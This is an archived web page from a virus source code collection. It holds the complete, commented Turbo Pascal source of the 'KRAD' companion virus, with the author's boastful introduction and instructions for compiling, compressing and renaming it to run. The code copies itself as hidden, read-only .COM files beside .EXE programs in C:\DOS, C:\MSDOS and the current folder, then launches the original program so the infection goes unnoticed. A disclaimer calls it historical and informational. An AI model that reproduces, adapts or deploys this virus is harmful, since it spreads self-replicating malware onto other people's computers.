<html>
<head><meta http-equiv=Content-Type content='text/html; charset=UTF-8'>

<title>Virus Source Code Database :: krad_pas</title>
<meta name="KEYWORDS" content="krad.pas, virus source, source code, assembly language, assembly programming, hacking, cracking, michaelangelo, stoned, pong, cascade, ambulance, f-prot, mcafee, panda, solomon, anti-virus, anti virus, computer virus">
<meta name="DESCRIPTION" content="Virus Source Code Database - source for krad.pas">
</head><body><table border=0 cellpadding=0 cellspacing=0 width="100%">
<tr><td valign=top width="25%">
<a href="kali-4_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kali-4_asm.php">kali-4_asm</a><br>
<a href="kaoshide_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kaoshide_asm.php">kaoshide_asm</a><br>
<a href="k_cmos_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/k_cmos_asm.php">k_cmos_asm</a><br>
<a href="k-cmos_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/k-cmos_asm.php">k-cmos_asm</a><br>
<a href="keepacid_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/keepacid_asm.php">keepacid_asm</a><br>
<a href="keepenem_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/keepenem_asm.php">keepenem_asm</a><br>
<a href="keykap_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/keykap_asm.php">keykap_asm</a><br>
<a href="keykapt2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/keykapt2_asm.php">keykapt2_asm</a><br>
<a href="keypress_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/keypress_asm.php">keypress_asm</a><br>
<a href="kiis_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kiis_asm.php">kiis_asm</a><br>
<a href="kildia_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kildia_asm.php">kildia_asm</a><br>
<a href="kill_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kill_asm.php">kill_asm</a><br>
<a href="kill_br_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kill_br_asm.php">kill_br_asm</a><br>
<a href="kill_rep_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kill_rep_asm.php">kill_rep_asm</a><br>
<a href="kinison__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kinison__asm.php">kinison__asm</a><br>
<a href="kinison_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kinison_asm.php">kinison_asm</a><br>
<a href="kinniso__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kinniso__asm.php">kinniso__asm</a><br>
<a href="kinnison_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kinnison_asm.php">kinnison_asm</a><br>
<a href="kinsn_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kinsn_asm.php">kinsn_asm</a><br>
<a href="kk2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kk2_asm.php">kk2_asm</a><br>
<a href="kod4_129_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kod4_129_asm.php">kod4_129_asm</a><br>
<a href="kod4_399_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kod4_399_asm.php">kod4_399_asm</a><br>
<a href="kode4-1__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kode4-1__asm.php">kode4-1__asm</a><br>
<a href="kode4-2__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kode4-2__asm.php">kode4-2__asm</a><br>
<a href="kohn_6_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kohn_6_asm.php">kohn_6_asm</a><br>
<a href="kohn_9_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kohn_9_asm.php">kohn_9_asm</a><br>
<a href="kompanio_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kompanio_asm.php">kompanio_asm</a><br>
<a href="krad_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/krad_pas.php">krad_pas</a><br>
<a href="krtt41_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/krtt41_asm.php">krtt41_asm</a><br>
<a href="krttdemo_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/krttdemo_asm.php">krttdemo_asm</a><br>
<a href="kstest_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kstest_asm.php">kstest_asm</a><br>
<a href="ksvir_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/ksvir_asm.php">ksvir_asm</a><br>
<a href="kuku_bas.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/kuku_bas.php">kuku_bas</a><br>
</td>
<td valign=top><center><h2>Virus Source Code Database</h2>
<script type="text/javascript">
<!--
                  google_ad_client = "pub-4280558320877613";
                  google_ad_width = 468;
                  google_ad_height = 60;
                  google_ad_format = "468x60_as";
                  google_ad_channel = "5524853059";
                  google_ad_type = "text";
                  google_color_border = "A2CCEE";
                  google_color_bg = "EFEFEF";
                  google_color_link = "000000";
                  google_color_url = "006600";
                  google_color_text = "000000";
        //--></script>
<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
<p>
<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
<p>
[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
[ <a href="index-1.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
[ <a href="index-2.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
[ <a href="index-3.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
[ <a href="index-4.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
[ <a href="index-5.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
[ <a href="index-6.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
[ <a href="index-7.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
[ <a href="index-8.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
[ <a href="index-9.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
[ <a href="index-10.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
[ <a href="index-11.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
[ <a href="index-12.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
[ <a href="index-13.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
[ <a href="index-14.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
[ <a href="index-15.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
[ <a href="index-16.php.htm" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
[ <a href="index-17.php.htm" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
[ <a href="index-18.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
[ <a href="index-19.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
[ <a href="index-20.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
[ <a href="index-21.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
[ <a href="index-22.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
[ <a href="index-23.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
[ <a href="index-24.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
[ <a href="index-25.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/z/index.php  \n\nThis file was not retrieved by Teleport Pro, because it was unavailable, or its retrieval was aborted, or the project was stopped too soon.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/z/index.php'" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
</center><p><textarea cols=90 rows=30>

                                                                               
                                                                              
Program KRAD;                                                                 
                                                                              
{      ____  _____        _______   ______                                    
      /___/\/____/\      /______/\ /_____/\___  __/\_____                     
      \   \|     \  \___|       \ |      \___/ /_    ___/ BOOM! <======       
       \           \/___|   +    \|   +  |/     /_/\/                         
        \______|\___________|\___________/                                    
                                                                              
                                                                              
       Virus Laboratories and Distribution                                    
          Proudly present the KRAD Virus                                      
     Written by Metabolis for non assembler ppls                              
                                                                              
                                                                              
          Why call it the KRAD virus?  Cos it is!  A companion virus          
          written in Turbo Pascal, well that just sums it up.  I wrote        
          this for two reasons.. 1) Not everyone knows assembler 2)           
          a friend reckoned a virus couldn't be programmed in Turbo           
          Pascal.. (by that he meant *I* couldn't do it).  No matter          
          how lame.. it's still a virus!  (Right up there with Aids/          
          Number 1 :))  Fully commented for non understanding Pascal          
          people, (a very small part of the world).                           
                                                                              
          Compress this with DIET/PkLite/LZEXE or something similar           
          when it's compiled.  Then rename it to a .COM file and hey          
          presto, you can run it!  I guess an added bonus of this             
          virus is, if there's another companion virus on your system         
          it won't overwrite it, it will take that as an infection            
          and leave it alone.                                                 
                                                                              
          KRAD virus will immediately infect C:\DOS or C:\MSDOS if            
          they exist, so if any DOS .EXE files are run it will infect         
          all the files in the current dir that you ran the DOS               
          command from. }                                                     
                                                                              
Uses Dos,Crt;  {Even if I don't use one of 'em..                              
               it's best to include both. }                                   
                                                                              
{$M 59999,0,8000}  {This program needs memory for two things..                
                    1) To use as a buffer when copying the virus              
                    2) To execute the program originally run. }               
                                                                              
Var Inf,Inf2:Searchrec;  {Used in the EXE and file_exist routines }           
    Infected:Boolean;    {Is a file infected? }                               
    Params:Byte;         {Loop Index for adding all parameters together }     
    All_Params:String;   {This string contains the whole list of parameters   
                          originally passed to the program }                  
    P:PathStr;           { Used by the FSplit procedure. }                    
    D:DirStr;            { "" }                                               
    N:NameStr;           { "" }                                               
    E:ExtStr;            { "" }                                               
                                                                              
Procedure Check_Infected(Path:String);                                        
{Is the .EXE file we've found infected? }                                     
Begin                                                                         
  FSplit(Inf.Name,D,N,E);             {Split it up into directory, name       
                                       and extension. }                       
  FindFirst(Path+N+'.COM',Anyfile,Inf2);   {Look for the .COM file with the   
                                       same file name, if this exists         
                                       then the file is already infected. }   
  Infected:=(DosError=0);             {Set the Infected flag }                
End;                                                                          
                                                                              
Procedure CopyFile(SourceFile, TargetFile:string);                            
{Straight Forward copying routine, I won't comment all of this.. }            
var                                                                           
  Source,                                                                     
  Target : file;                                                              
  BRead,                                                                      
  Bwrite : word;                                                              
  FileBuf  : array[1..2048] of char;                                          
Begin                                                                         
    Assign(Source,SourceFile);                                                
    SetFattr(Source,$20);              {Set the file attributes of the        
                                        hidden COM companion we're going      
                                        to be copying to archive so that      
                                        it's possible read it. }              
    {$I-}                                                                     
    Reset(Source,1);                                                          
    {$I+}                                                                     
    If IOResult <> 0 then                                                     
    Begin                                                                     
        Exit;                          {Couldn't open the source file! }      
    End;                                                                      
    Assign(Target,TargetFile);                                                
    {$I-}                                                                     
    Rewrite(Target,1);                                                        
    {$I+}                                                                     
    If IOResult <> 0 then                                                     
    Begin                                                                     
        Exit;                          {Couldn't open the target file! }      
    End;                                                                      
    Repeat                                                                    
         BlockRead(Source,FileBuf,SizeOf(FileBuf),BRead);                     
         BlockWrite(Target,FileBuf,Bread,Bwrite);                             
    Until (Bread = 0) or (Bread <> BWrite);                                   
    Close(Source);                                                            
    Close(Target);                                                            
    SetFattr(Source,3);                {Set the COM companion that we         
                                        copied back to hidden and             
                                        read-only. }                          
    SetFattr(Target,3);                                                       
End;                                                                          
                                                                              
Procedure FaI(Path:String);                                                   
{Find and Infect!}                                                            
Begin                                                                         
  FindFirst(Path+'*.EXE',AnyFile,Inf);  {Check for .EXEs to infect! }         
  While DosError=0 Do Begin                                                   
    Infected:=False;                                                          
    Check_Infected(Path);  { Check if the .EXE found is already infected. }   
    If Not Infected then Begin                                                
      CopyFile(ParamStr(0),Path+N+'.COM');                                    
    End;                                                                      
    { If the file isn't infected then copy the .COM version of the            
      file you're executing to companionship with the .EXE you have           
      found that isn't infected. }                                            
    FindNext(Inf);                                                            
  End;                                                                        
End;                                                                          
                                                                              
Begin                                                                         
  FaI('C:\DOS\');            { Find & Infect!  Go for the DOS dirs first }    
  FaI('C:\MSDOS\');          { because this is where most EXE files will }    
  FaI('');                   { be executed from! }                            
  FSplit(ParamStr(0),D,N,E); { Make sure we have the path and name of the     
                               file we actually want to execute. }            
  All_Params:='';   { "Remember to initialise those variables!" - Teacher }   
  For Params:=1 To ParamCount                                                 
       do All_Params:=All_Params+ParamStr(Params)+' ';                        
  Exec(D+N+'.EXE',All_Params);        {Execute the file that the user         
                                       wanted to in the first place           
                                       keeping all original parameters. }     
End.                                                                          
{Easy wasn't it?  I thought so.. }                                            
                                                                              
                                                                              
                                                                              
</textarea></td></tr></table></body></html>
